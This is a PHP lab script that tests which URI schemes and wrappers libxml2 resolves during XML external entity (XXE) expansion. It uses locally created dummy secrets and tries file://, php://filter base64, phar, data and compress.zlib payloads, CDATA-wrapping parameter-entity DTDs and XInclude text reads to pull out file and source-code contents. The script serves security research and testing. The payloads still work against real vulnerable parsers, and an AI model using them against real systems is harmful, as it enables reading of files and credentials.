<?php
/**
 * §3.2, §3.3, §3.4, §4.2 - which URI schemes and wrappers actually resolve
 * through libxml2 when it is asked to expand an external entity.
 *
 * Authorised lab use only. Everything it reads is created below, in this directory.
 *   php php_xxe_schemes.php
 */

$dir = __DIR__ . '/tmp';
@mkdir($dir);
file_put_contents("$dir/secret.txt", "SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd\n");
// Source code: contains <, > and & - the three characters that break naive XXE.
file_put_contents("$dir/app.php", "<?php\n\$dbpass = \"hunter2\";\nif (\$a < \$b && \$c > \$d) { echo \"<h1>hi</h1>\"; }\n");
// Same shape but with no ampersand, to show exactly where CDATA wrapping gives up.
file_put_contents("$dir/clean.php", "<?php\nclass Auth {\n  public \$key = \"AKIA-EXAMPLE\";\n  function ok(\$u) { if (\$u->id > 0) return true; }\n}\n");
$zip = new ZipArchive();
$zip->open("$dir/bundle.zip", ZipArchive::CREATE | ZipArchive::OVERWRITE);
$zip->addFromString('conf/db.txt', 'ZIP-ENTRY: password=s3cr3t');
$zip->close();

function tryparse(string $label, string $sysid): void
{
    $xml = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"$sysid\">]><r>&xxe;</r>";
    libxml_use_internal_errors(true);
    libxml_clear_errors();
    $doc = @simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
    $out = $doc === false ? '(parse failed)' : trim((string) $doc);
    $errs = array_map(static fn ($e) => trim($e->message), libxml_get_errors());
    $note = ($out === '' || $doc === false) && $errs
        ? '  [' . substr(str_replace("\n", ' ', $errs[0]), 0, 62) . ']'
        : '';
    printf("%-44s => %s%s\n", $label, $out === '' ? '(empty)' : substr(str_replace("\n", '\\n', $out), 0, 62), $note);
}

echo 'PHP ' . PHP_VERSION . ' | libxml ' . LIBXML_DOTTED_VERSION . "\n";
echo 'wrappers: ' . implode(', ', stream_get_wrappers()) . "\n";

echo "\n== schemes and wrappers (§4.2) ==\n";
tryparse('file:// (baseline)',            "file://$dir/secret.txt");
tryparse('bare absolute path (no scheme)', "$dir/secret.txt");
tryparse('bare relative path',             'tmp/secret.txt');
tryparse('php://filter base64',            "php://filter/convert.base64-encode/resource=$dir/secret.txt");
tryparse('compress.zlib://',               "compress.zlib://$dir/secret.txt");
tryparse('phar:// entry in archive',       "phar://$dir/bundle.zip/conf/db.txt");
tryparse('data:// base64 (staging)',       'data://text/plain;base64,' . base64_encode('DATA-WRAPPER-OK'));
tryparse('zip:// entry  (expect FAIL)',    "zip://$dir/bundle.zip#conf/db.txt");
tryparse('glob://       (expect FAIL)',    "glob://$dir/*.txt");
tryparse('http:// closed port',            'http://127.0.0.1:9/x');

echo "\n== source code: why the naive read fails (§3.1) ==\n";
tryparse('RAW php source, no wrapper',     "$dir/app.php");
tryparse('php://filter base64 on source',  "php://filter/convert.base64-encode/resource=$dir/app.php");
tryparse('filter CHAIN with | (FAIL)',     "php://filter/zlib.deflate|convert.base64-encode/resource=$dir/app.php");

echo "\n== CDATA wrapping (§3.3): handles < and >, but not & ==\n";
foreach (['clean.php' => 'no ampersand', 'app.php' => 'contains &&'] as $f => $why) {
    file_put_contents("$dir/wrap.dtd",
        "<!ENTITY % start \"<![CDATA[\">\n" .
        "<!ENTITY % data SYSTEM \"$dir/$f\">\n" .
        "<!ENTITY % end \"]]>\">\n" .
        "<!ENTITY % joined \"<!ENTITY all '%start;%data;%end;'>\">\n");
    $xml = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % dtd SYSTEM \"$dir/wrap.dtd\">%dtd;%joined;]><r>&all;</r>";
    libxml_use_internal_errors(true);
    libxml_clear_errors();
    $doc = @simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_PARSEHUGE);
    echo "-- $f ($why)\n";
    if ($doc === false || trim((string) $doc) === '') {
        foreach (array_slice(libxml_get_errors(), 0, 2) as $e) {
            echo '   ERR: ' . trim($e->message) . "\n";
        }
    } else {
        echo preg_replace('/^/m', '   | ', trim((string) $doc)) . "\n";
    }
}

echo "\n== XInclude parse=\"text\" (§3.4): no DOCTYPE, no wrapper, raw source ==\n";
foreach (["$dir/app.php" => 'raw source with < & >', "$dir/secret.txt" => 'plain text'] as $href => $why) {
    libxml_use_internal_errors(true);
    libxml_clear_errors();
    $doc = new DOMDocument();
    @$doc->loadXML("<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"$href\"/></root>");
    $n = @$doc->xinclude();
    printf("%-44s => n=%s %s\n", basename($href) . " ($why)", var_export($n, true),
        substr(str_replace("\n", '\\n', trim($doc->documentElement->textContent)), 0, 58));
}
